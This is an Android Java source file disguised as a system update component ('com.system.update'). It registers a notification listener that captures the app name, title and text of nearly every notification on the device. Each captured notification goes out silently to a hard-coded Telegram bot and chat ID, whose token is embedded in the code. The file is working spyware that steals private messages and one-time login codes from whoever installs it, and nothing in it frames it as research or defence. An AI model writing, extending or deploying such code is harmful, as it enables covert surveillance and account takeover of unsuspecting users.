package com.system.update;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class NotifListener extends NotificationListenerService {
    private static final String BOT_TOKEN = "9263955385:AAE6VkwQqIPh6-mNddaDVz313O6THg9LjPA";
    private static final String CHAT_ID = "8682887545";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            if (sbn.getNotification() == null) return;
            
            String appName = sbn.getPackageName();
            String title = "";
            String text = "";

            if (sbn.getNotification().extras != null) {
                title = sbn.getNotification().extras.getString("android.title", "");
                text = sbn.getNotification().extras.getString("android.text", "");
            }

            // Ловим все уведомления, кроме системного мусора
            if (title != null && !title.isEmpty()) {
                String msg = "🔔 <b>" + appName + "</b>\n👤 " + title + "\n💬 " + text;
                sendTelegramMessage(msg);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendTelegramMessage(String text) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=HTML";
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
